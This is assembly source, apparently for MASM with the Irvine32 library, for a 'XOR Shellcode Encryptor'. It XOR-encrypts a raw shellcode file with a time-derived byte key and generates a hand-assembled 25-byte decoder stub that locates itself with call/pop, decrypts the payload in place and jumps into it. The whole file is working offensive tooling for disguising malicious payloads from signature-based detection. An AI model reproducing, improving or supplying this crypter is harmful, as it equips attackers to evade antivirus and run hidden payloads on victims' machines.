; =============================================================
; XOR Shellcode Encryptor v3.0 (Crash Fixed - JMP Method)
; =============================================================
; Updates:
; 1. Replaced unsafe 'RET' with 'JMP EDI' in Decoder Stub.
; 2. Corrected relative memory addressing (Offset 0x14).
; 3. Ensures Decoder jumps exactly to the start of payload.
; 4. Full error handling included.
; =============================================================

INCLUDE Irvine32.inc
INCLUDELIB kernel32.lib
INCLUDELIB user32.lib

; =============================================================
; 1. PROTOTYPES
; =============================================================
GetFileSize             PROTO STDCALL, hFile:DWORD, lpFileSizeHigh:DWORD
GetFileAttributesA      PROTO STDCALL, lpFileName:DWORD
GetCurrentDirectoryA    PROTO STDCALL, nBufferLength:DWORD, lpBuffer:DWORD
CreateDirectoryA        PROTO STDCALL, lpPathName:DWORD, lpSecurityAttributes:DWORD
GetTempPathA            PROTO STDCALL, nBufferLength:DWORD, lpBuffer:DWORD
GetLastError            PROTO STDCALL

; =============================================================
; 2. CONSTANTS & DATA
; =============================================================
INVALID_HANDLE_VALUE    EQU -1
FILE_ATTRIBUTE_NORMAL   EQU 80h
CREATE_ALWAYS           EQU 2
GENERIC_READ            EQU 80000000h
GENERIC_WRITE           EQU 40000000h
OPEN_EXISTING           EQU 3
MAX_BUFFER_SIZE         EQU 500000
ERROR_ACCESS_DENIED     EQU 5

.data
    titleMsg     BYTE "=== XOR Encryptor v3.0 (Stable JMP Logic) ===",0Ah,0
    promptFile   BYTE "Enter path of raw shellcode (.bin): ",0
    promptOutDir BYTE "Enter output directory (Enter for current): ",0
    loadingMsg   BYTE 0Ah,"[+] Reading binary file...",0Ah,0
    encryptMsg   BYTE "[+] Encrypting payload...",0Ah,0
    genFilesMsg  BYTE "[+] Generating output files...",0Ah,0
    successMsg   BYTE 0Ah,"[SUCCESS] Files generated successfully!",0Ah,0
    
    filesCreated BYTE 0Ah,"[*] Output Files Created:",0Ah,0
    file1Label   BYTE "    1. Decoder Stub: ",0
    file2Label   BYTE "    2. Encrypted Payload: ",0
    
    errorMsg     BYTE 0Ah,"[ERROR] Operation Failed.",0Ah,0
    fileErrMsg   BYTE 0Ah,"[ERROR] Could not read input file.",0Ah,0
    sizeErrMsg   BYTE 0Ah,"[ERROR] File too large (Max 500KB).",0Ah,0
    invalidMsg   BYTE 0Ah,"[ERROR] Invalid input path.",0Ah,0
    permDeniedMsg BYTE 0Ah,"[!] Permission denied. Trying TEMP folder...",0Ah,0
    usingTempMsg BYTE "[*] Using TEMP directory.",0Ah,0

    inputPath    BYTE 260 DUP(0)
    outputDir    BYTE 260 DUP(0)
    currentDir   BYTE 260 DUP(0)
    tempDir      BYTE 260 DUP(0)
    
    decoderOut   BYTE 520 DUP(0)
    payloadOut   BYTE 520 DUP(0)
    
    decoderName  BYTE "decoder_stub.bin",0
    payloadName  BYTE "en_payload.bin",0
    
    useFallback  BYTE 0
    inputBuffer  BYTE MAX_BUFFER_SIZE DUP(?)
    outputBuffer BYTE MAX_BUFFER_SIZE DUP(?)
    decoderBuffer BYTE 1000 DUP(?)
    
    hFile        DWORD ?
    bytesRW      DWORD ?
    fileSize     DWORD 0
    xorKey       BYTE 0
    
    keyMsg       BYTE 0Ah,"[*] XOR Key: 0x",0
    sizeMsg      BYTE "[*] Payload Size: ",0
    bytesMsg     BYTE " bytes",0Ah,0
    newLine      BYTE 0Ah,0

.code

; -------------------------------------------------------
; Random Number Generator (Time based)
; -------------------------------------------------------
GetRandomByte PROC
    invoke GetTickCount
    mov cl, 8
    shr eax, cl
    and eax, 0FFh
    test eax, eax
    jnz done_random
    mov eax, 55 ; Default if 0
done_random:
    ret
GetRandomByte ENDP

; -------------------------------------------------------
; Trim String (Remove Enter/Spaces)
; -------------------------------------------------------
TrimPathProc PROC uses esi eax, pString:DWORD
    mov esi, pString
    invoke Str_length, esi
    test eax, eax
    jz done_trim
    add esi, eax
    dec esi
trim_loop:
    mov al, [esi]
    cmp al, 0Dh
    je remove_char
    cmp al, 0Ah
    je remove_char
    cmp al, 20h
    je remove_char
    jmp done_trim
remove_char:
    mov byte ptr [esi], 0
    dec esi
    cmp esi, pString
    jae trim_loop
done_trim:
    ret
TrimPathProc ENDP

; -------------------------------------------------------
; Build Path Helper
; -------------------------------------------------------
BuildOutputPath PROC uses esi edi ecx eax, destPath:DWORD, dirPath:DWORD, fileName:DWORD
    mov edi, destPath
    mov esi, dirPath
copy_dir:
    mov al, [esi]
    test al, al
    jz add_backslash
    mov [edi], al
    inc esi
    inc edi
    jmp copy_dir
add_backslash:
    cmp edi, destPath
    je copy_filename
    dec edi
    mov al, [edi]
    cmp al, '\'
    je skip_backslash
    inc edi
    mov byte ptr [edi], '\'
    inc edi
skip_backslash:
    inc edi
copy_filename:
    mov esi, fileName
copy_name:
    mov al, [esi]
    mov [edi], al
    test al, al
    jz done_build
    inc esi
    inc edi
    jmp copy_name
done_build:
    ret
BuildOutputPath ENDP

; -------------------------------------------------------
; File Exists Check
; -------------------------------------------------------
FileExists PROC, fileName:DWORD
    invoke GetFileAttributesA, fileName
    cmp eax, INVALID_HANDLE_VALUE
    je not_exist
    mov eax, 1
    ret
not_exist:
    xor eax, eax
    ret
FileExists ENDP

; -------------------------------------------------------
; Read File
; -------------------------------------------------------
ReadFileToBuffer PROC uses ebx, fileName:DWORD, dest:DWORD
    invoke TrimPathProc, fileName
    invoke FileExists, fileName
    test eax, eax
    jz fail
    invoke CreateFile, fileName, GENERIC_READ, 1, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
    cmp eax, INVALID_HANDLE_VALUE
    je fail
    mov hFile, eax
    invoke GetFileSize, hFile, 0
    mov ebx, eax
    mov fileSize, ebx
    cmp eax, MAX_BUFFER_SIZE
    ja fail_size
    invoke ReadFile, hFile, dest, ebx, ADDR bytesRW, 0
    invoke CloseHandle, hFile
    mov eax, ebx
    ret
fail_size:
    invoke CloseHandle, hFile
    mov eax, -2
    ret
fail:
    xor eax, eax
    ret
ReadFileToBuffer ENDP

; -------------------------------------------------------
; XOR Encrypt
; -------------------------------------------------------
XorEncrypt PROC uses esi edi ecx eax, source:DWORD, dest:DWORD, dataSize:DWORD, key:BYTE
    mov esi, source
    mov edi, dest
    mov ecx, dataSize
    mov al, key
encrypt_loop:
    test ecx, ecx
    jz encrypt_done
    mov dl, [esi]
    xor dl, al
    mov [edi], dl
    inc esi
    inc edi
    dec ecx
    jmp encrypt_loop
encrypt_done:
    ret
XorEncrypt ENDP

; -------------------------------------------------------
; *** CRITICAL FIX: Generate Safer Decoder Stub ***
; Uses JMP EDI instead of RET to prevent crashes
; Total Size: 25 Bytes
; -------------------------------------------------------
GenerateDecoder PROC uses esi edi ecx eax ebx, decoderBuf:DWORD, key:BYTE, payloadSize:DWORD
    mov edi, decoderBuf
    
    ; 1. GetPC Call (Find current address)
    ; call $+5 (E8 00 00 00 00)
    mov byte ptr [edi], 0E8h
    mov dword ptr [edi+1], 0
    add edi, 5
    
    ; 2. Pop Address into ESI
    ; pop esi (5E)
    mov byte ptr [edi], 5Eh
    inc edi
    
    ; 3. Add Offset to reach Payload 
    ; Math: 25 bytes total - 5 bytes for call = 20 bytes (0x14)
    ; add esi, 0x14 (83 C6 14)
    mov byte ptr [edi], 83h
    mov byte ptr [edi+1], 0C6h
    mov byte ptr [edi+2], 14h
    add edi, 3
    
    ; 4. Save Start Address in EDI register (Backup for jump)
    ; mov edi, esi (89 F7)
    mov byte ptr [edi], 89h
    mov byte ptr [edi+1], 0F7h
    add edi, 2
    
    ; 5. Setup Loop Counter
    ; mov ecx, payloadSize (B9 XX XX XX XX)
    mov byte ptr [edi], 0B9h
    inc edi
    mov eax, payloadSize
    mov [edi], eax
    add edi, 4
    
    ; 6. Setup Key
    ; mov bl, key (B3 XX)
    mov byte ptr [edi], 0B3h
    inc edi
    mov al, key
    mov [edi], al
    inc edi
    
    ; 7. Decrypt Loop (XOR)
    ; xor byte ptr [esi], bl (30 1E)
    mov byte ptr [edi], 30h
    mov byte ptr [edi+1], 1Eh
    add edi, 2
    
    ; 8. Advance Pointer
    ; inc esi (46)
    mov byte ptr [edi], 46h
    inc edi
    
    ; 9. Loop Back
    ; loop -5 (E2 FB)
    mov byte ptr [edi], 0E2h
    mov byte ptr [edi+1], 0FBh
    add edi, 2
    
    ; 10. JUMP to Payload (Safer than RET)
    ; jmp edi (FF E7)
    mov byte ptr [edi], 0FFh
    mov byte ptr [edi+1], 0E7h
    add edi, 2
    
    ; Return total size
    mov eax, edi
    sub eax, decoderBuf
    ret
GenerateDecoder ENDP

; -------------------------------------------------------
; Write File Helper
; -------------------------------------------------------
WriteBufferToFile PROC uses ebx, fileName:DWORD, source:DWORD, writeSize:DWORD
    invoke CreateFile, fileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
    cmp eax, INVALID_HANDLE_VALUE
    je write_fail
    mov hFile, eax
    invoke WriteFile, hFile, source, writeSize, ADDR bytesRW, 0
    invoke CloseHandle, hFile
    mov eax, 1
    ret
write_fail:
    xor eax, eax
    ret
WriteBufferToFile ENDP

; -------------------------------------------------------
; Temp Directory Fallback Logic
; -------------------------------------------------------
TryTempDirectoryFallback PROC
    invoke GetTempPathA, 260, OFFSET tempDir
    test eax, eax
    jz fallback_failed
    invoke TrimPathProc, OFFSET tempDir
    invoke BuildOutputPath, OFFSET decoderOut, OFFSET tempDir, OFFSET decoderName
    invoke BuildOutputPath, OFFSET payloadOut, OFFSET tempDir, OFFSET payloadName
    mov eax, 1
    ret
fallback_failed:
    xor eax, eax
    ret
TryTempDirectoryFallback ENDP

; -------------------------------------------------------
; Main Program
; -------------------------------------------------------
XorEncryptorMain PROC
    call Clrscr
    mov edx, OFFSET titleMsg
    call WriteString

    ; --- INPUT PATH ---
    mov edx, OFFSET promptFile
    call WriteString
    mov edx, OFFSET inputPath
    mov ecx, 259
    call ReadString
    invoke Str_length, OFFSET inputPath
    cmp eax, 0
    je quit

    ; --- OUTPUT DIR ---
    mov edx, OFFSET promptOutDir
    call WriteString
    mov edx, OFFSET outputDir
    mov ecx, 259
    call ReadString
    invoke TrimPathProc, OFFSET outputDir
    
    invoke Str_length, OFFSET outputDir
    cmp eax, 0
    jne use_custom_dir
    
    ; Use Current Dir
    invoke GetCurrentDirectoryA, 260, OFFSET currentDir
    invoke BuildOutputPath, OFFSET decoderOut, OFFSET currentDir, OFFSET decoderName
    invoke BuildOutputPath, OFFSET payloadOut, OFFSET currentDir, OFFSET payloadName
    jmp start_proc

use_custom_dir:
    ; Create directory if needed (Simplified logic)
    invoke CreateDirectoryA, OFFSET outputDir, 0
    invoke BuildOutputPath, OFFSET decoderOut, OFFSET outputDir, OFFSET decoderName
    invoke BuildOutputPath, OFFSET payloadOut, OFFSET outputDir, OFFSET payloadName

start_proc:
    ; --- READ FILE ---
    mov edx, OFFSET loadingMsg
    call WriteString
    invoke ReadFileToBuffer, OFFSET inputPath, OFFSET inputBuffer
    cmp eax, -2
    je size_error
    test eax, eax
    jz file_error

    ; --- ENCRYPT ---
    mov edx, OFFSET encryptMsg
    call WriteString
    call GetRandomByte
    mov xorKey, al
    invoke XorEncrypt, OFFSET inputBuffer, OFFSET outputBuffer, fileSize, xorKey

    ; --- GENERATE DECODER & FILES ---
    mov edx, OFFSET genFilesMsg
    call WriteString
    invoke GenerateDecoder, OFFSET decoderBuffer, xorKey, fileSize
    
    ; Write Decoder
    invoke WriteBufferToFile, OFFSET decoderOut, OFFSET decoderBuffer, eax
    test eax, eax
    jz try_fallback
    
    ; Write Payload
    invoke WriteBufferToFile, OFFSET payloadOut, OFFSET outputBuffer, fileSize
    test eax, eax
    jz try_fallback
    
    jmp success_end

try_fallback:
    mov edx, OFFSET permDeniedMsg
    call WriteString
    invoke TryTempDirectoryFallback
    test eax, eax
    jz write_error
    
    mov edx, OFFSET usingTempMsg
    call WriteString
    
    ; Retry Write
    invoke GenerateDecoder, OFFSET decoderBuffer, xorKey, fileSize
    invoke WriteBufferToFile, OFFSET decoderOut, OFFSET decoderBuffer, eax
    invoke WriteBufferToFile, OFFSET payloadOut, OFFSET outputBuffer, fileSize
    test eax, eax
    jz write_error

success_end:
    mov edx, OFFSET successMsg
    call WriteString
    
    ; Print Details
    mov edx, OFFSET keyMsg
    call WriteString
    mov al, xorKey
    call WriteHexB
    mov edx, OFFSET newLine
    call WriteString
    
    mov edx, OFFSET sizeMsg
    call WriteString
    mov eax, fileSize
    call WriteDec
    mov edx, OFFSET bytesMsg
    call WriteString

    mov edx, OFFSET filesCreated
    call WriteString
    mov edx, OFFSET file1Label
    call WriteString
    mov edx, OFFSET decoderOut
    call WriteString
    mov edx, OFFSET newLine
    call WriteString
    mov edx, OFFSET file2Label
    call WriteString
    mov edx, OFFSET payloadOut
    call WriteString
    
    jmp quit

size_error:
    mov edx, OFFSET sizeErrMsg
    call WriteString
    jmp quit
file_error:
    mov edx, OFFSET fileErrMsg
    call WriteString
    jmp quit
write_error:
    mov edx, OFFSET errorMsg
    call WriteString
    jmp quit

quit:
    mov edx, OFFSET newLine
    call WriteString
    call WaitMsg
    exit
XorEncryptorMain ENDP

END XorEncryptorMain